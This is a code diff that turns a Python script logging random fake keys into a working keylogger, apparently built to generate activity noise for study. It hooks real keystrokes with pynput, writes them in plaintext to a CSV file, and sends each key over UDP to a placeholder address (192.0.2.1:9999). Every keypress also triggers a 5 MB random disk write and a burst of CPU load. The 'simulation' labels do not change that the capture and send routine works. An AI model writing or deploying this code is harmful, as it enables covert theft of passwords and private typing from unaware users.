@@ -1,66 +1,92 @@
 import os
-import random
-import string
-import psutil
-import time
 import socket
+import time
 from datetime import datetime
+from pynput import keyboard
+import threading
+import random
+import csv
 
-# Setup log directory and file
+
+# === Setup Paths ===
 LOG_DIR = os.path.join(os.getcwd(), "log")
 os.makedirs(LOG_DIR, exist_ok=True)
-LOG_FILE = os.path.join(LOG_DIR, "system_fake_keylog.txt")
 
-def random_key():
-    return random.choice(string.ascii_letters + string.digits)
+KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.csv")
+NOISE_FILE = os.path.join(LOG_DIR, "disk_noise.tmp")
 
-def simulate_network_exfiltration(fake_data):
-    try:
-        # Simulate opening a socket (but don't connect)
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            s.connect(("192.0.2.1", 9999))  # non-routable IP, safe to simulate
-            s.send(fake_data.encode())
-    except Exception:
-        pass  # silently fail, we're only simulating
 
-def log_fake_keypress(file_path):
-    disk_io_burst = 1_000_000  # simulate 1MB disk write
-    fake_buffer = " " * 10_000  # RAM usage
+class IntenseKeyloggerLogger:
+    def __init__(self):
+        self.running = True
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
 
-    with open(file_path, 'a') as f:
-        while True:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            key = random_key()
+        # Initialize CSV file
+        self.csv_file = open(KEYLOG_FILE, 'a', newline='', buffering=1)
+        self.writer = csv.writer(self.csv_file)
 
-            # Resource snapshot
-            cpu = psutil.cpu_percent()
-            ram = psutil.virtual_memory().percent
-            disk = psutil.disk_io_counters().write_bytes
-            net = psutil.net_io_counters()
-            net_sent = net.bytes_sent
-            net_recv = net.bytes_recv
-            process_count = len(psutil.pids())
+        # Write headers if file is new
+        if os.stat(KEYLOG_FILE).st_size == 0:
+            self.writer.writerow([
+                "timestamp", "key", "disk_written_bytes",
+                "cpu_cycles_simulated", "network_data_sent", "event"
+            ])
 
-            # Log line
-            log_line = (
-                f"[{timestamp}] Key: {key} | CPU: {cpu:.1f}% | RAM: {ram:.1f}% "
-                f"| Disk: {disk} | Net: ({net_sent}, {net_recv}) | Procs: {process_count}\n"
-            )
-            f.write(log_line)
-            f.flush()
+    def on_key_press(self, key):
+        try:
+            key_str = key.char
+        except AttributeError:
+            key_str = str(key)
 
-            # Simulate disk activity
-            with open(os.path.join(LOG_DIR, "noise.tmp"), 'ab') as noise:
-                noise.write(os.urandom(disk_io_burst))
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        disk_bytes = 5 * 1024 * 1024  # 5MB
+        cpu_cycles = 10000  # CPU loop cycles
+        network_data = f"Key={key_str}&Time={timestamp}"
 
-            # Simulate "sending" key data over network
-            simulate_network_exfiltration(f"Key={key}&Time={timestamp}")
+        # Start all simulation functions
+        threading.Thread(target=self.simulate_disk_noise, args=(disk_bytes,)).start()
+        threading.Thread(target=self.simulate_cpu_load, args=(cpu_cycles,)).start()
+        threading.Thread(target=self.simulate_network_exfiltration, args=(network_data,)).start()
 
-            time.sleep(0.25)
+        # Log the combined event
+        self.writer.writerow([
+            timestamp, key_str, disk_bytes, cpu_cycles, network_data, "keypress"
+        ])
 
+    def simulate_disk_noise(self, size_bytes):
+        with open(NOISE_FILE, "ab") as f:
+            f.write(os.urandom(size_bytes))
+
+    def simulate_cpu_load(self, cycles):
+        end_time = time.time() + 2
+        while time.time() < end_time:
+            _ = sum([random.randint(1, 100) ** 2 for _ in range(cycles)])
+
+    def simulate_network_exfiltration(self, data):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                s.connect(("192.0.2.1", 9999))
+                s.send(data.encode())
+        except Exception:
+            pass
+
+    def run(self):
+        print("[🟡 LOGGER] Press any key to simulate and log activity (Ctrl+C to stop)...")
+        self.listener.start()
+        while self.running:
+            time.sleep(1)
+
+    def stop(self):
+        self.running = False
+        self.listener.stop()
+        self.csv_file.close()
+
+
+# === MAIN ===
 if __name__ == "__main__":
-    print("[FAKE LOGGER] Running simulated keylogger with network exfiltration... Ctrl+C to stop.")
+    logger = IntenseKeyloggerLogger()
     try:
-        log_fake_keypress(LOG_FILE)
+        logger.run()
     except KeyboardInterrupt:
-        print("\n[FAKE LOGGER] Stopped.")
+        logger.stop()
+        print("\n[🟢 LOGGER] Stopped and log file saved.")
